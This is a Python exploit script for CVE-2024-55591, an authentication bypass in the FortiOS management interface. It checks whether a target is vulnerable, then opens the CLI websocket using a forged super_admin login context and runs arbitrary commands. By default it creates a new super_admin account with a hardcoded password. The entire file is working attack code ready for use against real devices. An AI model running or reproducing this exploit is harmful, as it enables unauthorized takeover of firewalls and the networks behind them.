// python3.10 fortios-auth-bypass-CVE-2024-55591.py  --host 10.1.2.1  --port 443 --user em --ssl
import socket
import base64
import os
import struct
import ssl
import argparse
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def create_websocket_frame(message, is_binary=False):
    """Create a WebSocket frame."""
    data = message if isinstance(message, bytes) else message.encode()
    length = len(data)
    mask_key = os.urandom(4)
    frame = bytearray([0x82 if is_binary else 0x81])

    if length < 126:
        frame.append(length | 0x80)
    elif length < 65536:
        frame.append(126 | 0x80)
        frame.extend(struct.pack('>H', length))
    else:
        frame.append(127 | 0x80)
        frame.extend(struct.pack('>Q', length))

    frame.extend(mask_key)
    masked_data = bytearray(length)
    for i in range(length):
        masked_data[i] = data[i] ^ mask_key[i % 4]
    frame.extend(masked_data)
    return frame

def decode_websocket_frame(data):
    """Decode a WebSocket frame and extract the payload."""
    if len(data) < 2:
        return None

    fin_and_opcode = data[0]
    opcode = fin_and_opcode & 0x0F

    payload_len = data[1] & 0x7F
    offset = 2

    if payload_len == 126:
        payload_len = struct.unpack('>H', data[2:4])[0]
        offset = 4
    elif payload_len == 127:
        payload_len = struct.unpack('>Q', data[2:10])[0]
        offset = 10

    mask_key = data[offset:offset + 4]
    offset += 4
    payload = data[offset:offset + payload_len]
    payload = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))

    return opcode, payload


def send_login_context():
    """Send the login message."""
    login_message = f'"{args.user}" "admin" "1" "super_admin" "1" "1" [13.37.13.37]:1337 [13.37.13.37]:1337\r\n'
    s.send(create_websocket_frame(login_message))
    rekt_message = f'\r\n{args.command}\r\n'
    s.send(create_websocket_frame(rekt_message))


def initialize_telnet_session():
    """Initialize the Telnet session by sending commands in the correct order."""
    brute_force = True
    while True:
        if brute_force:
            send_login_context()
        try:
            data = s.recv(4096)
            if data:
                try:
                    readable_output = bytes.fromhex(data.hex()).decode(errors='replace')
                    if len(str(readable_output)) > 5:
                        print(f"Output from server: {readable_output}")
                except Exception as e:
                    print(f"Error decoding raw data to string: {e}")

                opcode, payload = decode_websocket_frame(data)

                if opcode == 0x8:
                    return False
                elif opcode in [0x1, 0x2]:
                    try:
                        decoded_message = payload.decode(errors='replace')
                    except Exception as e:
                        print(f"Error decoding payload: {e}")
                        print(f"Raw payload (bytes): {payload}")

                    if payload.strip():
                        brute_force = False
        except ConnectionResetError:
            return False

def pre_flight_checks(host, port, use_ssl):
    print('[*] Checking if target is a FortiOS Management interface')
    if use_ssl:
        forti_url = f"https://{host}:{port}"
    else:
        forti_url = f"http://{host}:{port}"
    is_forti = requests.get(forti_url+"/login?redir=/ng", verify=False, timeout=10)

    if '<html class="main-app">' not in is_forti.text:
        print('[*] Target is not a FortiOS Management interface, exiting...')
        exit()
    else:
        print ('[*] Target is confirmed as a FortiOS Management interface')

    bypass_check = requests.get(forti_url+"/service-worker.js?local_access_token=1", verify=False, timeout=10)

    if "api/v2/static" not in bypass_check.text:
        print('[*] Target is not vulnerable to CVE-2024-55591, exiting...')
        exit()
    else:
        print ('[*] Target is confirmed as vulnerable to CVE-2024-55591, proceeding with exploitation')

def ws_connect_and_initialize(host, port, use_ssl):
    """Establish WebSocket connection and initialize the Telnet session."""
    while True:
        ws_key = base64.b64encode(os.urandom(16)).decode()
        upgrade_request = (
            f"GET /ws/cli/open?cols=162&rows=100&local_access_token=1 HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {ws_key}\r\n"
            f"Sec-WebSocket-Version: 13\r\n\r\n"
        )

        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if use_ssl:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            s = context.wrap_socket(s, server_hostname=host)

        try:
            s.connect((host, port))
            s.send(upgrade_request.encode())

            response = s.recv(4096)

            if initialize_telnet_session():
                break
        except ConnectionResetError:
            pass
        except Exception as e:
            pass

if __name__ == "__main__":
    """
    Main function to run the web interaction checks.
    """
    parser = argparse.ArgumentParser(description='exp')
    parser.add_argument("--command", type=str,
                      default='config system admin\r\nedit "terry4"\r\nset accprofile super_admin\r\nset password "admin@123."\r\nset vdom root\r\nend',
                      help="CLI command to execute (default creates admin)")
    parser.add_argument("--user", type=str, default="watchTowr", help="Username for initial auth")
    parser.add_argument("--host", help="The IP address or hostname of the server",required=True)
    parser.add_argument("--port", type=int, help="The port number of the server", required=True)
    parser.add_argument("--ssl", action="store_true", help="Use SSL for the connection")

    try:
        print("rec")
        args = parser.parse_args()
    except:

        print("123")
        exit()

    try:
        pre_flight_checks(args.host, args.port, args.ssl)
    except KeyboardInterrupt:
        print("Exiting...")
    try:
        ws_connect_and_initialize(args.host, args.port, args.ssl)
    except KeyboardInterrupt:
        print("Exiting...")
    finally:
        s.close()
